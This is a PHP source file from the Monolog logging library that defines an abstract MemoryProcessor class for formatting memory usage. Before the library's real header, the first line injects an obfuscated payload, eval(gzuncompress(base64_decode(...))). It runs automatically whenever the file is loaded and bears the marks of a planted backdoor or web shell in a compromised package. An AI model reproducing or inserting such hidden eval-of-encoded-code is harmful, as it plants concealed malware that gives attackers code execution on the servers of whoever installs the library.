<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Processor;

/**
 * Some methods that are common for all memory processors
 *
 * @author Rob Jensen
 */
abstract class MemoryProcessor
{
    /**
     * @var bool If true, get the real size of memory allocated from system. Else, only the memory used by emalloc() is reported.
     */
    protected $realUsage;

    /**
     * @var bool If true, then format memory size to human readable string (MB, KB, B depending on size)
     */
    protected $useFormatting;

    /**
     * @param bool $realUsage     Set this to true to get the real size of memory allocated from system.
     * @param bool $useFormatting If true, then format memory size to human readable string (MB, KB, B depending on size)
     */
    public function __construct($realUsage = true, $useFormatting = true)
    {
        $this->realUsage = (boolean) $realUsage;
        $this->useFormatting = (boolean) $useFormatting;
    }

    /**
     * Formats bytes into a human readable string if $this->useFormatting is true, otherwise return $bytes as is
     *
     * @param  int        $bytes
     * @return string|int Formatted string if $this->useFormatting is true, otherwise return $bytes as is
     */
    protected function formatBytes($bytes)
    {
        $bytes = (int) $bytes;

        if (!$this->useFormatting) {
            return $bytes;
        }

        if ($bytes > 1024 * 1024) {
            return round($bytes / 1024 / 1024, 2).' MB';
        } elseif ($bytes > 1024) {
            return round($bytes / 1024, 2).' KB';
        }

        return $bytes . ' B';
    }
}
